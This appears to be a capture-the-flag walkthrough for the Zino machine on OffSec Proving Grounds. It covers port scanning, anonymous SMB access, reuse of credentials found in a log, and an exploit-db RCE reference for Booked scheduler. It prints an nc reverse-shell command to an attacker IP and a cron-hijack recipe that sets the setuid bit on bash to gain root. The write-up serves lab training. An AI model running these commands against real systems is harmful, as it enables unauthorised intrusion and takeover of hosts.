# Zino

## Info

Zino is an intermediate linux machine from offsec proving grounds.

## Nmap

All tcp ports.

```
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?      syn-ack ttl 61
8003/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.38
```

## smb

Anonymous smb login allowed.

```
smbclient -U "" //192.168.243.64/zino
```

The following credentials are found in misc.log.

```
admin:adminadmin
```

## HTTP 8003

Booked scheduler is vulnerable to the following rce exploit.

```
https://www.exploit-db.com/exploits/50594
```

## User

nc reverse shell.

```
nc -e /bin/bash 192.168.45.210 8003
```

## Root

The following cron job is running as root.

```
*/3 *   * * *   root    python /var/www/html/booked/cleanup.py
```

Create a new python file and copy to the file that the cron job is running.

```
echo '#!/usr/bin/env python' >> /tmp/cleanup.py
echo 'import os' >> /tmp/cleanup.py
echo 'os.system("chmod +s /bin/bash")' >> /tmp/cleanup.py
cp /tmp/cleanup.py /var/www/html/booked/cleanup.py
```

Wait and execute bash.

```
/bin/bash -p
```
